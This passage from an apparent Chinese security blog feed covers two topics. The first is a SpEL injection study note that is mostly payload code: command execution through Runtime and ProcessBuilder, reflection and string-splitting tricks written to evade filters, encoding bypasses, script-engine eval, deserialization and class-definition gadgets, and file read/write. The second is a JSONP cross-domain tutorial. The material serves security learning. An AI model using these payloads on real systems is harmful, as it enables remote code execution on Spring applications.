class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;.\\&quot;</span>).start().getInputStream(), <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;asfsfsdfsf&quot;</span>).next()</span><br></pre></td></tr></table></figure></li></ol><h2 id="SPEL变形与tips"><a href="#SPEL变形与tips" class="headerlink" title="SPEL变形与tips"></a>SPEL变形与tips</h2><h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Runtime</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">T(Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"><span class="comment">// ProcessBuilder</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br></pre></td></tr></table></figure><h3 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射调用+字符串拼接，绕过正则过滤</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="绕过-getClass-过滤"><a href="#绕过-getClass-过滤" class="headerlink" title="绕过 getClass 过滤"></a>绕过 <strong>getClass 过滤</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#x27;&#x27;.getClass 替换为 &#x27;&#x27;.class.getSuperclass().class</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.class.getSuperclass().class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="number">14</span>].invoke(<span class="string">&#x27;&#x27;</span>.class.getSuperclass().class.forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="number">7</span>].invoke(<span class="literal">null</span>),<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"><span class="comment">// char转字符串，再字符串concat</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="JavaScript引擎"><a href="#JavaScript引擎" class="headerlink" title="JavaScript引擎"></a>JavaScript引擎</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="JavaScript-反射"><a href="#JavaScript-反射" class="headerlink" title="JavaScript+反射"></a>JavaScript+反射</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="JavaScript-URL编码"><a href="#JavaScript-URL编码" class="headerlink" title="JavaScript+URL编码"></a>JavaScript+URL编码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Jshell"><a href="#Jshell" class="headerlink" title="Jshell"></a>Jshell</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="string">&quot;jdk.jshell.JShell&quot;</span>,<span class="literal">true</span>).Methods[<span class="number">6</span>].invoke(<span class="literal">null</span>,&#123;&#125;).eval(<span class="string">&#x27;whatever java code in one statement&#x27;</span>).toString()</span><br></pre></td></tr></table></figure><h3 id="其他Tips"><a href="#其他Tips" class="headerlink" title="其他Tips"></a>其他Tips</h3><h4 id="绕过T-过滤"><a href="#绕过T-过滤" class="headerlink" title="绕过T 过滤"></a>绕过T 过滤</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T%<span class="number">00</span>(<span class="keyword">new</span>)</span><br><span class="line">这涉及到SpEL对字符的编码，%<span class="number">00</span>会被直接替换为空</span><br></pre></td></tr></table></figure><h4 id="使用Spring工具类反序列化，绕过new关键字"><a href="#使用Spring工具类反序列化，绕过new关键字" class="headerlink" title="使用Spring工具类反序列化，绕过new关键字"></a>使用Spring工具类反序列化，绕过new关键字</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(<span class="string">&#x27;rO0AB...&#x27;</span>))</span><br><span class="line"><span class="comment">// 可以结合CC链食用</span></span><br></pre></td></tr></table></figure><h4 id="使用Spring工具类执行自定义类的静态代码块"><a href="#使用Spring工具类执行自定义类的静态代码块" class="headerlink" title="使用Spring工具类执行自定义类的静态代码块"></a>使用Spring工具类执行自定义类的静态代码块</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="string">&#x27;Singleton&#x27;</span>,T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(<span class="string">&#x27;yv66vgAAADIAtQ....&#x27;</span>),T(org.springframework.util.ClassUtils).getDefaultClassLoader())</span><br></pre></td></tr></table></figure><p>需要在自定义类写静态代码块 <code>static&#123;&#125;</code></p><h3 id="读写文件和回显"><a href="#读写文件和回显" class="headerlink" title="读写文件和回显"></a>读写文件和回显</h3><h4 id="无版本限制回显"><a href="#无版本限制回显" class="headerlink" title="无版本限制回显"></a>无版本限制回显</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;.\\&quot;</span>).start().getInputStream(), <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;asfsfsdfsf&quot;</span>).next()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="nio-读文件"><a href="#nio-读文件" class="headerlink" title="nio 读文件"></a>nio 读文件</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">String</span>(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create(<span class="string">&quot;file:/C:/Users/helloworld/1.txt&quot;</span>))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="nio-写文件"><a href="#nio-写文件" class="headerlink" title="nio 写文件"></a>nio 写文件</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create(<span class="string">&quot;file:/C:/Users/helloworld/1.txt&quot;</span>)), <span class="string">&#x27;123464987984949&#x27;</span>.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/zpchcbd/p/15536569.html">https://www.cnblogs.com/zpchcbd/p/15536569.html</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p>]]></content>
    
    
    <summary type="html">对SPEL表达式的学习</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>jsonp学习</title>
    <link href="https://h0ld1rs.github.io/posts/54936.html"/>
    <id>https://h0ld1rs.github.io/posts/54936.html</id>
    <published>2022-03-18T05:59:32.000Z</published>
    <updated>2022-03-18T06:00:38.927Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jsonp学习"><a href="#jsonp学习" class="headerlink" title="jsonp学习"></a>jsonp学习</h1><h1 id="0x01-jsonp"><a href="#0x01-jsonp" class="headerlink" title="0x01 jsonp"></a>0x01 jsonp</h1><h2 id="为何使用"><a href="#为何使用" class="headerlink" title="为何使用"></a>为何使用</h2><p>JSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。</p><h2 id="情形举例"><a href="#情形举例" class="headerlink" title="情形举例"></a>情形举例</h2><p>假设 <code>a.com</code>下存在data.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> username<span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span> password<span class="punctuation">:</span> <span class="string">&quot;secret&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>而下面的html文件用于发起Ajax请求获取data.json的内容并记录日志：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&#x27;./jquery.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> $.<span class="title function_">ajax</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="attr">url</span>: <span class="string">&#x27;http://a.com/data.json&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="attr">type</span>:<span class="string">&quot;get&quot;</span>,     </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>如果该HTML文件处于<code>a.com</code>和<code>data.json</code>同域时,访问该HTML文件能够正常获取<code>json</code>文件的内容。</p><p>但是如果该HTML文件放置在<code>b.com</code>下，即和<code>data.json</code>文件不同域，访问HTML文件时，浏览器会报错，因为，ajax不能发起跨域请求。</p><p>但是，为了方便程序间数据的调用，就搞了几种跨域的方法，其中包括<code>jsonp</code></p><p>简单来说，就是利用script标签的src属性能够发起跨域请求的原理来实现的。</p><p>将HTML修改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;./jquery.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"> s.<span class="property">src</span> = <span class="string">&#x27;http://a.com/data.json&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，再次访问就会发现，可以发起跨域请求了，但是，会看到浏览器报错，因为<code>data.json</code>中的内容不符合<code>javascript</code>的代码规范</p><p>重新定义json文件的内容，让其更符合<code>jsonp</code>规范</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(<span class="punctuation">&#123;</span> username<span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span> password<span class="punctuation">:</span> <span class="string">&quot;secret&quot;</span> <span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure><p>然后我们在HTML文件中添加<code>callback</code>函数的定义即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;./jquery.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">json</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(json);</span></span><br><span class="line"><span class="language-javascript"> &#125;</span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"> s.<span class="property">src</span> = <span class="string">&#x27;http://a.com/data.json&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，最基本的<code>jsonp</code>功能就基本实现了，我们的web站点的HTML文件能够正常的获取目标<code>外域</code>的json数据。</p><p>&#x3D;&#x3D;至此，我们就清楚了：JSONP就是跨域技术的一种，用来方便Web站点突破SOP的限制从外域端点获取数据&#x3D;&#x3D;</p><h2 id="json与jsonp的区别"><a href="#json与jsonp的区别" class="headerlink" title="json与jsonp的区别"></a>json与jsonp的区别</h2><ul><li>JSON（JavaScript Object Notation），即JavaScript对象表示法。</li><li>JSONP（JSON with Padding）即填充式的JSON，通过填充额外的内容把JSON数据包装起来，变成一段有效的可以独立运行的JavaScript语句。它是基于JSON 格式的为解决跨域请求资源而产生的解决方案，基本原理是利用HTML里script元素标签，远程调用JSON文件来实现数据传递。</li></ul><p><code>JSONP</code>常见的基本语法是：<code>callback(&#123;&quot;name&quot;:&quot;h0ld1rs&quot;,msg:&quot;success&quot;&#125;)</code></p><p>常见的例子包括 函数调用（如callback({“a”:”b”})）或变量赋值（var a&#x3D;{JSON data}）。</p><h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p>借鉴菜鸟教程 </p><h4 id="原生样式"><a href="#原生样式" class="headerlink" title="原生样式"></a>原生样式</h4><p>jsonp.php，作为jsonp端点，动态生成<code>JSONP</code>格式数据，文件放置在第三方服务器中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="variable">$jsoncallback</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;callback&#x27;</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="variable">$json_data</span> = <span class="string">&#x27;[&quot;test&quot;,&quot;https://www.test.com&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jsoncallback</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$json_data</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>jsonp.html，先在script标签中定义，再通过另一个script标签的src属性来实现跨域访问目标JSONP端点获取根据传参动态生成的JSONP数据，文件放置于本地服务器中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;here&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">callbackFunction</span>(<span class="params">result, methodName</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + result[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;here&#x27;</span>).<span class="property">innerHTML</span> = html;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.68.130/jsonp.php?callback=callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220207201142.png"></p><h3 id="Jquery的三种样式"><a href="#Jquery的三种样式" class="headerlink" title="Jquery的三种样式"></a>Jquery的三种样式</h3><h4 id="getJSON"><a href="#getJSON" class="headerlink" title="$.getJSON"></a>$.getJSON</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;here&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$.<span class="title function_">getJSON</span>(<span class="string">&quot;http://192.168.68.130/jsonp.php?callback=?&quot;</span>, <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">   